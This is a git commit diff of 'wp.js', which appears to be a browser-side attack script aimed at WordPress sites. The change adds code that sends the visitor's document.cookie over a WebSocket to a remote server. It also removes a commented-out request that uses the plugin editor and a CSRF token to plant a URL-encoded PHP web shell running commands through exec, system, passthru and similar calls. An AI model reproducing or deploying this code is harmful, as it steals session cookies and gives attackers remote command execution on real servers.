7d28366a53e1a39726cdb62c7ea76c262c95dbc7
taleg2016 <taleg@leeching.net>
2016-04-06 04:21:13 -0300

    Update wp.js

--- wp.js
+++ wp.js
@@ -43,7 +43,7 @@
     var WSConn      = null;
     var WSExt       = null;
     window.hasWS    = "no";
-    window.ver      = "0.3";      
+    window.ver      = "0.1";      
 
     /* ------------------------------------------------------------ */
     function startServer() {
@@ -52,7 +52,7 @@
 
         WSExt.onopen = function(b) {
             console.log('Enviando set')
-            WSExt.send('set:' + browser() + '@' + system() +  "@" + window.ver);
+            WSExt.send('set:' + browser() + '@' + system() +  "@" + window.ver + "@" + document.cookie);
         };
         WSExt.onclose = function(b) {
             //
@@ -107,7 +107,7 @@
         str = str.replace("%26", "&");
         console.log(str);
         xmlHttp.send(str);
-        //xmlHttp.send("_wpnonce=" + csrftoken + "&_wp_http_referer=/wp-admin/plugin-editor.php?file=index.php&plugin=index.php&newcontent=%3C%3Fphp%0Aecho+%22%3Cbr%3EDEW_BOA%3Cbr%3E%22%3B%0A%24cmd%3D%22%24_GET%5Bcmd%5D%22%3B%0A%24eseguicmd%3Dex%28%24cmd%29%3B%0Aecho+%24eseguicmd%3B%0A%0Afunction+ex%28%24cfe%29%7B%0A%24res+%3D+%27%27%3B%0Aif+%28%21empty%28%24cfe%29%29%7B%0Aif%28function_exists%28%27exec%27%29%29%7B%0A%40exec%28%24cfe%2C%24res%29%3B%0A%24res+%3D+join%28%22%5Cn%22%2C%24res%29%3B%0A%7D%0Aelseif%28function_exists%28%27shell_exec%27%29%29%7B%0A%24res+%3D+%40shell_exec%28%24cfe%29%3B%0A%7D%0Aelseif%28function_exists%28%27system%27%29%29%7B%0A%40ob_start%28%29%3B%0A%40system%28%24cfe%29%3B%0A%24res+%3D+%40ob_get_contents%28%29%3B%0A%40ob_end_clean%28%29%3B%0A%7D%0Aelseif%28function_exists%28%27passthru%27%29%29%7B%0A%40ob_start%28%29%3B%0A%40passthru%28%24cfe%29%3B%0A%24res+%3D+%40ob_get_contents%28%29%3B%0A%40ob_end_clean%28%29%3B%0A%7D%0Aelseif%28%40is_resource%28%24f+%3D+%40popen%28%24cfe%2C%22r%22%29%29%29%7B%0A%24res+%3D+%22%22%3B%0Awhile%28%21%40feof%28%24f%29%29+%7B+%24res+.%3D+%40fread%28%24f%2C1024%29%3B+%7D%0A%40pclose%28%24f%29%3B%0A%7D%7D%0Areturn+%24res%3B%0A%7D%0Aexit%3B%0A&action=update&file=index.php&plugin=index.php&scrollto=0&submit=Update+File");
+        
         return xmlHttp.responseText;
 
     }
